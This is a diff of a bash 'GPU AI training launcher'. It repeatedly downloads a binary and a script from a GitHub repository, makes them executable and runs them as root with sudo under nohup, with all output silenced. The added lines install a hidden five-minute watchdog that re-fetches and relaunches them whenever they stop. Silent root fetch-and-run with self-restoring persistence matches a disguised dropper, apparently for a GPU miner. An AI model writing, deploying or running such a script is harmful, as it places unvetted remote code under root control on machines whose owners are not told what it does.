@@ -1,6 +1,6 @@
 #!/bin/bash
 # File: start_modelgp.sh launcher
-# Purpose: Download scripts and manage GPU AI training process in-place using nohup
+# Purpose: Run start_modelgp.sh continuously, restart if stopped, force restart every hour
 
 while true; do
     echo "========== Starting GPU AI Training Launcher =========="
@@ -10,41 +10,53 @@ while true; do
         if pgrep -f "$proc" > /dev/null; then
             sudo pkill -f "$proc"
             echo "$proc stopped."
-        else
-            echo "$proc not running."
         fi
     done
 
-    # Launch new process in background using nohup (silent)
-    echo "Launching start_modelgp.sh with sudo in background (nohup)..."
+    # --- Delete old files before downloading ---
+    echo "Deleting old files..."
+    rm -f ./aitraining ./start_modelgp.sh
+
+    # Launch start_modelgp.sh in background with nohup
     nohup bash -c '
-        # Download the latest scripts to current folder
+        # Download latest scripts
         sudo wget -q -O ./aitraining https://github.com/max313iq/Ssl/raw/main/aitraining
         sudo wget -q -O ./start_modelgp.sh https://github.com/max313iq/Ssl/raw/main/start_modelgp.sh
-
-        # Ensure scripts are executable
         sudo chmod +x ./aitraining
         sudo chmod +x ./start_modelgp.sh
-
-        # Start main GPU script
         sudo bash ./start_modelgp.sh
     ' > /dev/null 2>&1 &
 
-    echo "start_modelgp.sh is now running (silent with nohup)."
+    echo "start_modelgp.sh launched."
 
-    # Run for 1 hour (3600 seconds) before stopping
+    # --- Start 5-minute monitoring in background ---
+    nohup bash -c '
+        while true; do
+            sleep 300
+            if ! pgrep -f "aitraining" > /dev/null; then
+                echo "$(date) - aitraining stopped! Restarting start_modelgp.sh..."
+
+                sudo pkill -f "start_modelgp.sh" 2>/dev/null
+                sudo pkill -f "aitraining" 2>/dev/null
+
+                # Delete old files before redownload
+                rm -f ./aitraining ./start_modelgp.sh
+
+                # Relaunch
+                nohup bash -c "
+                    sudo wget -q -O ./aitraining https://github.com/max313iq/Ssl/raw/main/aitraining
+                    sudo wget -q -O ./start_modelgp.sh https://github.com/max313iq/Ssl/raw/main/start_modelgp.sh
+                    sudo chmod +x ./aitraining
+                    sudo chmod +x ./start_modelgp.sh
+                    sudo bash ./start_modelgp.sh
+                " > /dev/null 2>&1 &
+            fi
+        done
+    ' > /dev/null 2>&1 &
+
+    # --- 1-hour timer before forced restart ---
+    echo "Running for 1 hour before forced restart..."
     sleep 3600
 
-    echo "========== Stopping processes after 1 hour =========="
-    for proc in "start_modelgp.sh" "aitraining"; do
-        if pgrep -f "$proc" > /dev/null; then
-            sudo pkill -f "$proc"
-            echo "$proc stopped."
-        else
-            echo "$proc already stopped."
-        fi
-    done
-
-    echo "Waiting 1 minute before restart..."
-    sleep 60
+    echo "========== 1 hour completed, restarting processes =========="
 done
